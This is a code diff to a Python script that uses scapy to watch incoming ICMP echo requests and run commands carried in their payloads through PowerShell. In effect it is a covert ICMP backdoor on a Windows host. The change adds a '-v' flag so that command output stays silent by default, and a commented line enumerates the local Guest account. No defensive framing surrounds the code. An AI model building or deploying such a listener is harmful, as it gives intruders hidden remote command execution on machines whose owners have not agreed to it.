@@ -1,8 +1,9 @@
 from scapy.all import *
 import subprocess as sp
 import threading
+import sys
 cmn_cmds = []
-
+verbose = False
 
 def cmd_mon(pkt):
     if str(pkt.getlayer(ICMP).type) == "8":
@@ -13,6 +14,7 @@ def cmd_mon(pkt):
 
 
 def cmd_proc(cmd):
+    global verbose
     prefix = cmd[0]
     term = cmd[1]
     cmd = cmd[3::]
@@ -29,7 +31,7 @@ def cmd_proc(cmd):
             cmd = cmd.split(" ")
             cmd.insert(0, "powershell")
             result = sp.run(cmd, capture_output=True)
-            if result.check_returncode() is None:
+            if result.check_returncode() is None and verbose:
                 print(result.stdout.decode())
         elif term == "s":
             print("This taps into the stored commands")
@@ -53,12 +55,17 @@ def sniffer():
 
 
 def main():
-    #t1 = threading.Thread(target=heart)
-    t2 = threading.Thread(target=sniffer)
-    #t1.start()
-    t2.start()
-    #t1.join()
-    t2.join()
+    global verbose
+    try:
+        if sys.argv[1] == "-v":
+            verbose = True
+    finally:
+        #t1 = threading.Thread(target=heart)
+        t2 = threading.Thread(target=sniffer)
+        #t1.start()
+        t2.start()
+        #t1.join()
+        t2.join()
 
 #cmd_proc("ep Get-LocalUser -Name Guest")
 main()
